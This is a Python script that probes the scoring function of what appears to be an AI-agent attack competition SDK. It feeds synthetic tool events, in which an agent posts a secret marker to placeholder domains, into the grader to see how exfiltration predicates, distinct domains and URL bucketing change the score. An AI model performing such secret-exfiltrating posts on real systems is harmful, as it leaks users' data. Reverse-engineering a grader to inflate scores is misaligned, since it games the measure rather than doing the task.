import itertools, random
from aicomp_sdk.core.predicates import eval_predicates, SECRET_MARKER
from aicomp_sdk.core.cells import cell_signature, _bucket_url
from aicomp_sdk.scoring import score_attack

def ev(name, args, ok=True, source="tool", side_effect="NONE", scope="external", output="ok", error=""):
    return {"name":name,"args":args,"ok":ok,"source":source,"side_effect":side_effect,
            "scope":scope,"output":output,"error":error}

def post(url):
    return ev("http.post", {"url":url, "data":SECRET_MARKER}, side_effect="SHARE")

def make_finding(tool_events):
    preds = eval_predicates({"tool_events":tool_events,"user_messages":["hello"]})
    sig = cell_signature(tool_events)  # score_cell_signature: NO user_messages
    return {"predicates":preds, "score_cell_signature":sig}

print("=== SECRET_MARKER value:", repr(SECRET_MARKER))

# ---------- CLAIM: score_attack is ORDER-INDEPENDENT (commutative) ----------
# Build 6 distinct-domain single-post candidates
cands = [make_finding([post(f"http://d{i}.com/x")]) for i in range(6)]
base = score_attack(cands, normalize=False)
scores = set()
for perm in itertools.permutations(cands):
    scores.add(round(score_attack(list(perm), normalize=False), 6))
print(f"[ORDER] 6 distinct-domain findings, all {720} permutations distinct scores? -> unique scores = {scores}  base={base}")

# ---------- CLAIM: truncation is the ONLY order effect (first N scored) ----------
# high-value candidate (8 posts=8 EXFIL) vs low-value (1 post). Cap at 1 -> order decides.
hi = make_finding([post(f"http://hi{i}.com") for i in range(8)])   # 8*16 +2cell
lo = make_finding([post("http://lo.com")])                          # 1*16 +2cell
CAP=1
s_hi_first = score_attack([hi,lo][:CAP], normalize=False)
s_lo_first = score_attack([lo,hi][:CAP], normalize=False)
print(f"[TRUNCATION] cap={CAP}: hi-first raw={s_hi_first}  lo-first raw={s_lo_first}  (order matters ONLY via truncation)")
print(f"[TRUNCATION] no cap: both orders raw={score_attack([hi,lo],normalize=False)} / {score_attack([lo,hi],normalize=False)}")

# ---------- CLAIM: same-domain x8 vs distinct-domain x8 WITHIN one candidate ----------
same8   = make_finding([post("http://s.co") for _ in range(8)])
dist8   = make_finding([post(f"http://d{i}.co") for i in range(8)])
n_same_preds = len(same8["predicates"]); n_dist_preds = len(dist8["predicates"])
print(f"\n[WITHIN-CAND] same-domain x8: #EXFIL preds={n_same_preds}, ONE cell hash={same8['score_cell_signature']['hash']}")
print(f"[WITHIN-CAND] dist-domain x8: #EXFIL preds={n_dist_preds}, ONE cell hash={dist8['score_cell_signature']['hash']}")
print(f"[WITHIN-CAND] raw same8={score_attack([same8],normalize=False)}  raw dist8={score_attack([dist8],normalize=False)}  (predicate count identical; single cell each)")

# ---------- CLAIM: distinct vs same domain matters only ACROSS candidates (+2/cell) ----------
N=50
across_distinct = [make_finding([post(f"http://u{i}.com")]) for i in range(N)]
across_same     = [make_finding([post("http://same.com")]) for i in range(N)]
rd = score_attack(across_distinct, normalize=False)
rs = score_attack(across_same, normalize=False)
uniq_d = len({f["score_cell_signature"]["hash"] for f in across_distinct})
uniq_s = len({f["score_cell_signature"]["hash"] for f in across_same})
print(f"\n[ACROSS-CAND N={N}] distinct-domains: uniq_cells={uniq_d} raw={rd}   same-domain: uniq_cells={uniq_s} raw={rs}")
print(f"[ACROSS-CAND] delta from distinct domains = {rd-rs} raw = +2 per extra cell = {(rd-rs)} (severity term identical: {N}*16={N*16})")

# ---------- CLAIM: bare single-letter host -> _bucket_url='unknown' (cells collapse) ----------
print(f"\n[URL-MIN] _bucket_url('a') -> {_bucket_url('a')!r} ; _bucket_url('http://a.co/x') -> {_bucket_url('http://a.co/x')!r}")
bare = [make_finding([post(chr(97+i))]) for i in range(26)]  # bare hosts a..z
uniq_bare = len({f["score_cell_signature"]["hash"] for f in bare})
print(f"[URL-MIN] 26 distinct BARE single-letter hosts -> uniq cells = {uniq_bare} (all collapse to 'unknown' domain)")
